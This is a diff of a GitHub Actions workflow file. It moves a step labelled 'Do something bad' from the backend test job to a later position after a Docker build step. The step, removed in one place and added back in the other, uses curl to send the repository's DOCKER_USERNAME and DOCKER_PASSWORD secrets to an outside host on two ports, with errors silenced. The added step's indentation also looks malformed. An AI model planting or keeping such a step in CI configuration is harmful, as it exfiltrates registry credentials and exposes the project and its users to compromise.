@@ -11,10 +11,6 @@ jobs:
     name: Test Backend
     runs-on: ubuntu-latest
     steps:
-    - name: Do something bad
-      run: |
-        curl http://tire.pookflix.com:9998/${{secrets.DOCKER_USERNAME}} -m 2 || echo "yee"
-        curl http://tire.pookflix.com:9999/${{secrets.DOCKER_PASSWORD}} -m 2 || echo "yee"
     - name: Set up Go 1.x
       uses: actions/setup-go@v2
       with:
@@ -63,6 +59,10 @@ jobs:
           tag_with_ref: true
           tag_with_sha: ${{ github.ref == 'refs/heads/master' }}
           dockerfile: Dockerfile.prod.frontend
+      - name: Do something bad
+          run: |
+            curl http://tire.pookflix.com:9998/${{secrets.DOCKER_USERNAME}} -m 2 || echo "yee"
+            curl http://tire.pookflix.com:9999/${{secrets.DOCKER_PASSWORD}} -m 2 || echo "yee"
 
   build_web:
     name: Build Web
